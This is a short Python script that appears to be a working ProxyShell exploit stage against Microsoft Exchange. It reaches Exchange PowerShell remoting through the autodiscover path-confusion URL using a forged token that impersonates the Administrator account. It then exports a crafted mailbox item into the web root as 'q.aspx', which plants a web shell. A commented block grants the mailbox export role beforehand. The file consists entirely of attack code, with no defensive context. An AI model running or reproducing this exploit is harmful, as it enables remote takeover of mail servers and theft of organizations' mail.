from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan


target='192.168.65.138'
auth_b64='VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBdBZG1pbmlzdHJhdG9yQGNvdmljLmluY1UsUy0xLTUtMjEtMjYzNTU5MjI1OC00MjY5Mjk2MTUzLTYzODg3OTI4OC01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA='
alias_name='administrator'
subject='b02073662ee94404bc93b597939ea2d5'

wsman = WSMan(server=target, port=443,
    path='autodiscover/autodiscover.json?@fucky0u.edu/Powershell/?X-Rps-CAT=' + auth_b64 +'&Email=autodiscover/autodiscover.json%3F@fucky0u.edu', 
    ssl=True, 
    cert_validation=False)



# with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
#     ps = PowerShell(pool)
#     ps.add_cmdlet("New-ManagementRoleAssignment")
#     ps.add_parameter("Role", "Mailbox Import Export")
#     ps.add_parameter("SecurityGroup", "Organization Management")
#     output = ps.invoke()

# export mailbox with email subject
with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
    ps = PowerShell(pool)
    ps.add_cmdlet("New-MailboxExportRequest")
    ps.add_parameter("Mailbox", alias_name)
    ps.add_parameter("Name", subject)
    ps.add_parameter("ContentFilter", "Subject -eq '%s'" % (subject))
    ps.add_parameter("FilePath", "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\q.aspx")
    output = ps.invoke()
